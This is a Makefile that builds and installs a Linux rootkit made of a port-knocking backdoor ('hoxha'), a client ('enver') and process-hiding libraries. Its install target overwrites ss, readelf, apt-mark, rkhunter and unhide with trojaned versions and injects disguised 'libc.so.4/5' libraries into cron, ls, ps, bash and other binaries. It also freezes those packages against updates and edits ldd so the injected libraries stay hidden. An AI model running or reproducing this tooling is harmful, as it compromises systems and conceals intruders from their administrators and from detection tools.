CC        := cc
OUT       := hoxha
CLIENT    := enver
UPX		 := ./upx
SSTRIP    := ./sstrip
SRC       := knocker.c mutate.c anti_debug.c
BINDIR    := /usr/bin
LIBDIR    := /lib/x86_64-linux-gnu
CHMOD     := chmod +x
PATCH     := ./patchelf --add-needed
TOOLS     := tools
CLIENTSRC := enver.c anti_debug.c mutate.c
PACKAGES  := apt apt-utils libapt-pkg-dev libapt-pkg7.0 sockstat iproute2 bash dash elfutils
MARCH 	 := $(shell gcc -Q -march=native --help=target | grep -m1 march= | awk '{print $$2}' | tr -d '[:space:]')

# Library targets
LIBEXEC  := libexec.so
LIBHIDE  := libhide.so
PERSIST_SRC := libexec.c libhide.c

# Common flags
COMMON_CFLAGS := -s -pipe -march=$(MARCH) -O2 -std=gnu23 -Wall -Wextra -Werror -pedantic \
                 -fno-stack-protector -fno-asynchronous-unwind-tables -fno-ident \
                 -ffunction-sections -fdata-sections -falign-functions=1 \
                 -falign-loops=1 --no-data-sections -falign-jumps=1 \
                 -falign-labels=1 -flto -fipa-icf -z execstack

COMMON_LDFLAGS := -Wl,-z,norelro -Wl,-O1 -Wl,--build-id=none -Wl,-z,separate-code
LIBS      := -lpthread

# Library-specific flags
LIB_CFLAGS := -fPIC -Wall -Wextra -pedantic -O2 -pipe -std=c23 -march=$(MARCH) -shared -ldl -static -s -nostartfiles

.PHONY: all clean install main

all: main

ifneq ($(shell id -u), 0)
	@echo "You must be root to perform this action."
else
	@echo "\nWhen the enemy advances, withdraw; when he stops, harass; when he tires, strike; when he retreats, pursue. - Mao Zedong\n"
endif

main: $(OUT) $(CLIENT) $(LIBEXEC) $(LIBHIDE)

$(OUT): $(SRC)
	$(CC) $(SRC) -o $@ $(COMMON_CFLAGS) $(COMMON_LDFLAGS) $(LIBS)
	$(CHMOD) $(UPX)
	$(CHMOD) $(SSTRIP)
	$(CHMOD) ./patchelf
	$(UPX) --best --brute $(OUT)
	$(SSTRIP) -z $(OUT)

$(CLIENT): $(CLIENTSRC)
	$(CC) $(CLIENTSRC) -o $@ $(COMMON_CFLAGS) $(COMMON_LDFLAGS)
	$(UPX) --best --brute $(CLIENT)
	$(SSTRIP) -z $(CLIENT)

$(LIBEXEC): libexec.c
	$(CC) $(LIB_CFLAGS) -o $@ $< $(COMMON_LDFLAGS)

$(LIBHIDE): libhide.c
	$(CC) $(LIB_CFLAGS) -o $@ $< $(COMMON_LDFLAGS)

install:
	install -Dm755 $(OUT) $(BINDIR)/$(OUT)
	install -Dm755 $(CLIENT) $(BINDIR)/$(CLIENT)
	$(CHMOD) ./tools/apt
	$(CHMOD) ./tools/apt-mark
	$(CHMOD) ./tools/sockstat
	$(CHMOD) ./tools/readelf
	$(CHMOD) ./tools/ss
	$(CHMOD) ./tools/rkhunter
	$(CHMOD) ./tools/unhide
	cp $(LIBEXEC) $(LIBDIR)/libc.so.4
	cp $(LIBHIDE) $(LIBDIR)/libc.so.5
	cp $(TOOLS)/ss $$(which ss)
	cp $(TOOLS)/readelf $$(which readelf)	
	@if which sockstat >/dev/null 2>&1; then \
		cp $(TOOLS)/sockstat $$(which sockstat); \
	fi
	cp $(TOOLS)/apt-mark $$(which apt-mark)
	cp $$(which dash) .
	cp $$(which bash) .
	
	@if which rkhunter >/dev/null 2>&1; then \
 		cp $(TOOLS)/rkhunter $$(which rkhunter); \
	fi
	@if which unhide >/dev/null 2>&1; then \
 		cp $(TOOLS)/unhide $$(which unhide); \
	fi
	systemctl stop cron
	$(CHMOD) ./patchelf
	$(PATCH) $(LIBDIR)/libc.so.4 $$(which cron)
	systemctl start cron
	$(PATCH) $(LIBDIR)/libc.so.5 /bin/ls
	$(PATCH) $(LIBDIR)/libc.so.5 $$(which ps)
	$(PATCH) $(LIBDIR)/libc.so.5 $$(which lsof)
	$(PATCH) $(LIBDIR)/libc.so.5 $$(which kill)
	$(PATCH) $(LIBDIR)/libc.so.5 $$(which pidof)
	$(PATCH) $(LIBDIR)/libc.so.5 $$(which pgrep)
	$(PATCH) $(LIBDIR)/libc.so.5 $$(which pkill)
	$(PATCH) $(LIBDIR)/libc.so.5 $$(which killall)
	$(PATCH) $(LIBDIR)/libc.so.5 ./dash
	$(PATCH) $(LIBDIR)/libc.so.5 ./bash
	cp -f ./dash $$(which dash)
	cp -f ./bash $$(which bash)
	@sudo apt-mark hold $(PACKAGES)
	
	sed -i 's/try_trace \"$$RTLD\" \"$$file\" || result=1/try_trace \"$$RTLD\" \"$$file\" | grep -vE \"libc.so.4|libc.so.5\" || result=1/g' $$(which ldd)
	@echo "\nThere may be thousands of principles of Marxism, but in the final analysis they can be summed up in one sentence: Rebellion is justified. - Mao Zedong\n"
clean:
	rm -f $(OUT) $(CLIENT) $(LIBEXEC) $(LIBHIDE) ./dash ./bash
